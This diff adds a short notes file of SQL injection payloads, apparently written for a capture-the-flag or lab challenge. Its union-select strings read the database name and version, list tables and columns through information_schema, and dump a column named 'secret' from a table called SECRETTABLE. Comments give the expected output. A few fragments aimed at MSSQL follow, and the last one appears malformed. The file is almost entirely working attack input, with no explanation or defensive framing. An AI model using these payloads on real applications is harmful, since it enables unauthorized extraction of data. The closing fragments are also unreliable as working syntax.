@@ -1,0 +1,14 @@
+2' union select all '1',database(),'&' order by 1;#
+2' union select all '1',version(),'&' order by 1;#
+1' union select '0','1',GROUP_CONCAT(table_name SEPARATOR ' ') from information_schema.tables where table_type='base table' order by 1#(will get SECRETTABLE foo inject3_users)
+1' union select '0','1',GROUP_CONCAT(column_name SEPARATOR ' ') from information_schema.columns where table_name='SECRETTABLE' order by 1#(will get id secret)
+1' union select '0','1',GROUP_CONCAT(secret SEPARATOR ' ') from SECRETTABLE order by 1#(will get id secret)
+
+
+
+select name from sysdatabases
+
+
+db_name()
+
+2' union select all '1',sysdatabases,'&' order by 1;#
